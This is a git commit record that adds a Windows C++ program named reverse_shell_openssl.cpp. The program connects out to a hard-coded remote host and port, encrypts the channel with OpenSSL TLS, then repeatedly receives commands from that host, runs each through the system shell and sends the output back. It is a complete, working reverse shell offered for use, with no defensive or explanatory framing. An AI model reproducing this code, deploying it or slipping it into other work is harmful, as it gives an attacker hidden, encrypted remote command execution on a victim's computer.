050f70e0b457fcb965e53a22b5cc6e0163cef1c4
AStar <sda06407@gmail.com>
2022-08-29 01:43:23 +0800

    Create reverse_shell_openssl.cpp

---
+++ reverse_shell_openssl.cpp
@@ -0,0 +1,176 @@
+#define _WINSOCK_DEPRECATED_NO_WARNINGS
+#define _CRT_SECURE_NO_WARNINGS
+
+#include <winsock2.h>
+#include <ws2tcpip.h>
+#include <stdio.h>
+#include <string.h>
+
+#include <openssl/ssl.h>
+#include <openssl/err.h>
+#include <openssl/applink.c>
+
+#pragma comment (lib, "Ws2_32.lib")
+
+#define DEFAULT_BUFLEN 512
+#define FAIL    -1
+
+#define WIN32_LEAN_AND_MEAN
+
+SOCKET OpenConnection(char* hostname, char* port)
+{
+    WSADATA wsaData;
+    SOCKET ConnectSocket = INVALID_SOCKET;
+    struct addrinfo* result = NULL;
+    struct addrinfo* ptr = NULL;
+    struct addrinfo hints;
+    char recvbuf[DEFAULT_BUFLEN];
+    int iResult;
+    int recvbuflen = DEFAULT_BUFLEN;
+
+    // Initialize Winsock
+    iResult = WSAStartup(MAKEWORD(2, 2), &wsaData);
+    if (iResult != 0) {
+        printf("WSAStartup failed with error: %d\n", iResult);
+        return 1;
+    }
+
+    ZeroMemory(&hints, sizeof(hints));
+    hints.ai_family = AF_UNSPEC;
+    hints.ai_socktype = SOCK_STREAM;
+    hints.ai_protocol = IPPROTO_TCP;
+
+    // Resolve the server address and port
+    iResult = getaddrinfo(hostname, port, &hints, &result);
+    if (iResult != 0) {
+        printf("getaddrinfo failed with error: %d\n", iResult);
+        WSACleanup();
+        return 1;
+    }
+    ptr = result;
+    // Create a SOCKET for connecting to server
+    ConnectSocket = WSASocketW(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol, NULL, 0, 0);
+    //ConnectSocket = socket(ptr->ai_family, ptr->ai_socktype, ptr->ai_protocol);
+    if (ConnectSocket == INVALID_SOCKET) {
+        printf("socket failed with error: %ld\n", WSAGetLastError());
+        WSACleanup();
+        return 1;
+    }
+
+    // Connect to server.
+    iResult = connect(ConnectSocket, ptr->ai_addr, (int)ptr->ai_addrlen);
+    if (iResult == SOCKET_ERROR) {
+        closesocket(ConnectSocket);
+        ConnectSocket = INVALID_SOCKET;
+    }
+
+    return ConnectSocket;
+}
+
+
+SSL_CTX* InitCTX(void)
+{
+    OpenSSL_add_all_algorithms();  /* Load cryptos, et.al. */
+    SSL_load_error_strings();   /* Bring in and register error messages */
+    const SSL_METHOD* method = TLSv1_2_client_method();  /* Create new client-method instance */
+    SSL_CTX* ctx = SSL_CTX_new(method);   /* Create new context */
+    if (ctx == NULL)
+    {
+        ERR_print_errors_fp(stderr);
+        abort();
+    }
+    return ctx;
+}
+
+
+void ShowCerts(SSL* ssl)
+{
+    X509* cert;
+    char* line;
+    cert = SSL_get_peer_certificate(ssl); /* get the server's certificate */
+    if (cert != NULL)
+    {
+        printf("Server certificates:\n");
+        line = X509_NAME_oneline(X509_get_subject_name(cert), 0, 0);
+        printf("Subject: %s\n", line);
+        line = X509_NAME_oneline(X509_get_issuer_name(cert), 0, 0);
+        printf("Issuer: %s\n", line);
+        X509_free(cert);     /* free the malloc'ed certificate copy */
+    }
+    else
+        printf("Info: No client certificates configured.\n");
+}
+
+void execute(SSL* ssl, char* cmdline) {
+
+    FILE* pipe;
+    const char* endstring = " 2>&1";
+    strncat(cmdline, endstring, sizeof(endstring));
+    pipe = _popen(cmdline, "r");
+    char buffer[128] = {0};
+    
+    if (!pipe) {
+        puts("popen() failed!");
+    }
+    try {
+        // read till end of process:
+        while (fgets(buffer, sizeof(buffer), pipe) != NULL) {
+            SSL_write(ssl, buffer, strlen(buffer));
+        }
+        _pclose(pipe);
+    }
+    catch (...) {
+        _pclose(pipe);
+        throw;
+    }
+}
+
+int main(int argc, char* argv[])
+{
+    char buf[1024] = {0};
+    SSL_library_init();
+    char hostname[] = "172.23.137.86"; // change this
+    char portnum[] = "3000"; // change this
+
+    SSL_CTX* ctx = InitCTX();
+    SOCKET server = OpenConnection(hostname, portnum);
+    SSL* ssl = SSL_new(ctx);      /* create new SSL connection state */
+    SSL_set_fd(ssl, server);    /* attach the socket descriptor */
+
+    if (SSL_connect(ssl) == FAIL) {
+        ERR_print_errors_fp(stderr);
+    }
+    else {
+        const char* cpRequestMessage = "";
+
+        printf("\n\nConnected with %s encryption\n", SSL_get_cipher(ssl));
+
+        /* get any certs */
+        ShowCerts(ssl);
+
+        while (1){
+            /* get reply & decrypt */
+            const char *startupchar = ">";
+            SSL_write(ssl, startupchar, strlen(startupchar));
+            int bytes = SSL_read(ssl, buf, sizeof(buf));
+            buf[bytes-1] = 0;
+
+            if(strstr(buf, "exit")) {
+                break;
+            }
+            /* encrypt & send message */
+            execute(ssl, buf);      
+        }
+
+        /* release connection state */
+        puts("finish");
+
+        SSL_free(ssl);
+    }
+  
+    /* close socket */
+    closesocket(server);
+    /* release context */
+    SSL_CTX_free(ctx);
+    return 0;
+}
